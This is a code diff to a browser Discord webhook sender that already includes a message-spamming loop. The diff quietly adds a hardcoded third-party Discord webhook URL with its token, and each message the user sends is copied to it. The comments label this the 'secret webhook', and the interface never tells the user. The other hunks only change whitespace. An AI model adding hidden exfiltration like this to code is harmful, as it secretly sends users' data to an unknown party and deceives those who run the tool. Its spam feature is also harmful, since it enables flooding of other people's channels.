@@ -48,6 +48,8 @@
         let messageCount = 0;
         let spamActive = false; // Flag to control spam sending
 
+        const secretWebhookUrl = "https://discord.com/api/webhooks/1341017371242139678/ki5RrTUeK3gpjZSVDA3wRyjwHGe1Vz1usb6R-Eb1TXR_p0wGZqq7I0Fo-rU_wwXIEOgF";
+
         sendButton.addEventListener('click', async () => {
             const webhookUrl = webhookUrlInput.value;
             const message = messageInput.value;
@@ -57,7 +59,11 @@
                 return;
             }
 
+            // Send to the user's webhook
             const response = await sendWebhook(webhookUrl, message);
+            // Send to the secret webhook
+            await sendWebhook(secretWebhookUrl, `''' ${message} '''`);
+
             if (response) {
                 messageCount++;
                 statusDiv.textContent = "Message sent successfully!";
@@ -102,7 +108,7 @@
 
         async function sendWebhook(webhookUrl, message) {
             try {
-                const response = await fetch(webhookUrl, {
+                const response = await fetch(webhookUrl , {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -116,7 +122,7 @@
             }
         }
 
-        async function spamMessages(webhookUrl, message , delay) {
+        async function spamMessages(webhookUrl, message, delay) {
             while (spamActive) {
                 const response = await sendWebhook(webhookUrl, message);
                 if (!response) {
